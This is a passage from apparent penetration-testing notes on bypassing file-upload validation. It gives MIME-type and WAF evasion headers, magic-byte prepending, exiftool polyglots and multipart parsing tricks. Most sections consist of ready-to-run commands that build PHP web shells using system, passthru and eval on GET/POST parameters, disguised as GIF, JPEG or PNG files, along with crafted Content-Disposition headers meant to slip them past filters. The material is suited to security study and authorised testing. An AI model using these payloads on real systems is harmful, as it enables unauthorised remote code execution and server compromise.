>  :: Timeout          : 10
>  :: Threads          : 40
>  :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
>  :: Filter           : Response size: 23
> ________________________________________________
> 
> image/gif               [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 0ms]
> image/jpeg              [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 0ms]
> image/jpg               [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 0ms]
> image/png               [Status: 200, Size: 26, Words: 3, Lines: 1, Duration: 1ms]
> :: Progress: [2387/2387] :: Job [1/1] :: 52 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
> ```
> - From the output, we can see that the application accepts four image MIME types:
> - `image/gif`
> - `image/jpeg`
> - `image/jpg`
> - `image/png`

- If it's a WAF rule, try:

```bash
# case variations:
Content-Type: APPLICATION/X-PHP
Content-Type: application/X-Php

# whitespaces:
Content-Type: application/x-php
Content-Type: application/ x-php
Content-Type: application/x -php

# encoding
Content-Type: application/x%2Dphp
Content-Type: application\x2Fx-php
```

>[!note] See [`Common media types — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types/Common_types).
### Magic bytes bypass

>**Magic bytes** (also known as **magic numbers** or **file signatures**) are a fixed sequence of bytes at the beginning of a file that uniquely identify its format.

- Magic types are typically 2-8 hexadecimal digits at the beginning of a file. Application sometimes use them to verify type of the uploaded flies. 
- **Common file signatures**:

| Format | Magic bytes (hex)                          | ASCII representation |
| ------ | ------------------------------------------ | -------------------- |
| JPEG   | `FF D8 FF E0`<br>`FF D8 FF EE`             | `ÿØÿà`<br>`ÿØÿî`     |
| PNG    | `89 50 4E 47 0D 0A 1A 0A`                  | `‰PNG␍␊␚␊`           |
| GIF    | `47 49 46 38 37 61`<br>`47 49 46 38 39 61` | `GIF87a`<br>`GIF89a` |
| PDF    | `25 50 44 46 2D`                           | `%PDF-`              |

>[!note] Some formats have multiple valid signatures to account for different versions of the same format. 

>[!note] See [`List of file signatures — Wikipedia`](https://en.wikipedia.org/wiki/List_of_file_signatures).

>[!note] The Linux [`file`](https://man.archlinux.org/man/file.1.en) command uses magic bytes to identify file types; it ignores the extension entirely. 


>[!example]- Example: Vulnerable code 
> ```Python
> def is_valid_image(filepath):
>     with open(filepath, 'rb') as f:
>         header = f.read(8)
>     
>     # check for JPEG signature
>     if header.startswith(b'\xFF\xD8\xFF'):
>         return True
>     # check for PNG signature
>     if header.startswith(b'\x89PNG\r\n\x1a\n'):
>         return True
>     
>     return False
> 
> ```

Some ways to change file signature:

- **Prepend a GIF signature**:

```bash
echo "GIF89a" > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

>[!example]+
> ```bash
> echo "GIF89a" > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
> ```
> - Verify using `file`: 
> ```bash
> file shell.php
> ```
> 
> ```
> shell.php: GIF image data, version 89a, 15370 x 28735
> ```

>[!note] GIF is probably the most forgiving format, as its signature can be written as  printable ASCII (`GIF89a` or `GIF87a`); the PHP parser, for example, handles the garbage header gracefully.


- **Prepend a JPEG signature**:

```bash
printf '\xFF\xD8\xFF\xE0' > shell.php.jpg && echo '<?php system($_GET["cmd"]); ?>' >> shell.php.jpg
```

- **Prepend a PNG signature**:

```bash
printf '\x89\x50\x4E\x47\x0D\x0A\x1A\x0A' > shell.png.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.png.php
```

- Prepend `GIF89a` signature (hex):

```bash
printf '\x47\x49\x46\x38\x39\x61' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
```

>[!example]-
> ```bash
> printf '\x47\x49\x46\x38\x39\x61' > shell.php && echo '<?php system($_GET["cmd"]); ?>' >> shell.php
> ```
> - Verify using `file`: 
> ```bash
> file shell.php
> ```
> 
> ```
> shell.php: GIF image data, version 89a, 16188 x 26736
> ```

- You can also use a hex editor like [`hexedit`](https://man.archlinux.org/man/hexedit.1.en) (Linux) to modify file at a byte level directly: 

![[hexedit.png]]

> [!note] You should _replace_ bytes at the start of an existing file rather than prepending.
> 
> - Prepending shifts all file content and corrupts the file structure. 
> - If you use a hex editor (e.g., `hexedit` on Linux), *overwrite* the first `N` bytes with the target signature. 
> - With a PHP script, prepending an ASCII signature (like `GIF89a`) before the `<?php` tag is fine because PHP parses files from the first `<?` tag and ignores the preceding text.

### Polyglot files

- A polyglot file is valid in two different formats simultaneously. 
- The most common technique for file upload is embedding PHP code inside a legitimate image's metadata using `exiftool`, so the file passes both magic bytes validation (it's a real JPEG) and format-level validation (it has valid EXIF data), but still contains executable PHP code.

It might be possible to introduce a web shell right in the metadata of a legitimate file:

- Inject PHP in JPEG `Comment` field:

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg
```

- Inject into multiple EXIF fields for redundancy (just so it executes for sure ):

```bash
exiftool -Artist='<?php passthru($_GET["x"]); ?>' \
         -Copyright='<?php eval($_POST["c"]); ?>' \
         -Comment='<?php system($_GET["cmd"]); __halt_compiler();' \
         image.jpg -o shell.jpg
```


>[!note] **`__halt_compiler()`** is a PHP compiler directive that halts execution at that point. Adding it after your payload prevents PHP from attempting to parse the binary image data that follows, which would otherwise generate errors.

- Alternatively, append PHP to the end of a legitimate image:

```bash
echo '<?php system($_GET["cmd"]); ?>' >> image.png
```


>[!tip]+ Surviving image processing (PHP-GD)
>If the server resizes or re-compresses images with PHP-GD or ImageMagick, standard EXIF injection will be destroyed. Use PNG PLTE chunk injection or JPEG IDAT chunk injection — these survive compression because they are embedded in the image's color table or compressed data stream. See [`Synacktiv's research`](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) for the tooling.
### HTTP parameter pollution in multipart requests


- Another way to bypass validation is to include *multiple conflicting instances of the same header or parameter within a multipart request*, exploiting parsing discrepancies between the WAF and the backend application to bypass validation. This technique is called **HTTP Parameter Pollution (HPP)**.
Parameters to target:

- The [`name`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition#name) parameter within the `Content-Disposition` header of a multipart request part (contains the name of the HTML field on the form):

```bash
Content-Disposition: form-data; name="file"; name="email" filename="mountains.jpg"
```

- The [`filename`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition#filename) parameter withing the `Content-Disposition` header (contains the name of the file transmitted):

```bash
Content-Disposition: form-data; name="file"; filename="shell.php" filename="mountains.jpg"
```

- The [`Content-Disposition`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Disposition) header:

```bash
Content-Disposition: form-data; name="file"; filename="mountains.jpg"
Content-Disposition: form-data; name="file"; filename="shell.php"
```

- The [`Content-Type`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Content-Type) header of a multipart request part:

```bash
Content-Type: image/jpeg
Content-Type: application/x-httpd-php
```

>[!tip] Test in both orders: safe value first and safe value last. Different parsers have different precedence rules.

- Try to confuse parsers by adding unexpected characters to one of the parameters:

```bash
# whitespaces
Content-Type: application/x-httpd-php
Content-Type:  image/jpeg
Content-Type: image/ jpeg
Content-Type: image /jpeg

# tabs
Content-Type: application/x-httpd-php
	Content-Type: image/jpeg
```


### Removing double quotes from `filename`

- [RFC 7578](https://datatracker.ietf.org/doc/html/rfc7578) specifies that `filename` parameters should be quoted. Many WAF rules expect quoted filenames. If you remove the quotes, the WAF parser may fail to extract the filename, treating the part as a non-file form field:

```http
# standard (quoted):
Content-Disposition: form-data; name="file"; filename="shell.php"

# unquoted — may bypass WAF parsing:
Content-Disposition: form-data; name="file"; filename=shell.php

# single-quoted — RFC non-compliant, some parsers accept it:
Content-Disposition: form-data; name="file"; filename='shell.php'
```

- Combine this with HPP:

```http
Content-Disposition: form-data; name="file"; filename=shell.php
Content-Disposition: form-data; name="file"; filename="mountains.jpg"
```

### Removing the closing boundary

- Multipart requests are supposed to end with a closing boundary (`--boundary--`). Some parsers process partial requests without it. Removing the closing boundary can cause the WAF to fail parsing while the backend still processes the file:

```http
POST /upload HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
<other headers...>
Content-Length: <total size of the request body>
Content-Type: multipart/form-data; boundary=---------------------------7970204168003706453399115153

---------------------------7970204168003706453399115153
Content-Disposition: form-data; name="file"; filename="mountains.jpg"
Content-Type: image/jpeg

<binary content of the JPEG file...>
---------------------------7970204168003706453399115153
Content-Disposition: form-data; name="description"

A very interesting description of an image.
# no boundary
```


> [!note] This behavior was documented in a PHP bug report ([`Bug #81987 Incomplete Multipart/form-data but is passed to PHP`](https://bugs.php.net/bug.php?id=81987)). Parser leniency around malformed multipart boundaries is a consistent source of WAF bypass opportunities.

### `filename*=utf-8` bypass

- [`RFC 5987`](https://datatracker.ietf.org/doc/html/rfc5987) defines an encoding syntax for non-ASCII characters in HTTP header parameter values using the format `param*=charset''encoded-value`. Some parsers handle this encoding; others do not:

```http
Content-Disposition: form-data; name="file"; filename*=UTF-8''shell.php
Content-Disposition: form-data; name="file"; filename*=utf-8''shell%2Ephp
```

- If the WAF parser does not implement `RFC 5987` decoding but the backend does, the WAF sees an unrecognized parameter format and may skip validation.

## References and further reading

- [`Breaing Down Multipart Parsers: File upload validation bypass — Andrea Menin, Sicuranext`](https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass/)


- [`File Upload Bypass: Understanding and Mitigating Risks in Web Applications — hiddeninvestigations.net`](https://hiddeninvestigations.net/blog/file-upload-bypass-understanding-and-mitigating-risks-in-web-applications)

- [`Breaking Down Multipart Parsers: File upload validation bypass — sicuranext, Andrea Menin`](https://blog.sicuranext.com/breaking-down-multipart-parsers-validation-bypass)
- [`File upload vulnerabilities — VeryLazyTech`](https://www.verylazytech.com/file-upload-vulnerabilities)

- [`Common media types — mdn web docs`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/MIME_types/Common_types)

- [`Client-side form validation — mdn web docs`](https://developer.mozilla.org/en-US/docs/Learn_web_development/Extensions/Forms/Form_validation)

- [`RFC 7578 — Returning Values from Forms: multipart/form-data`](https://datatracker.ietf.org/doc/html/rfc7578)



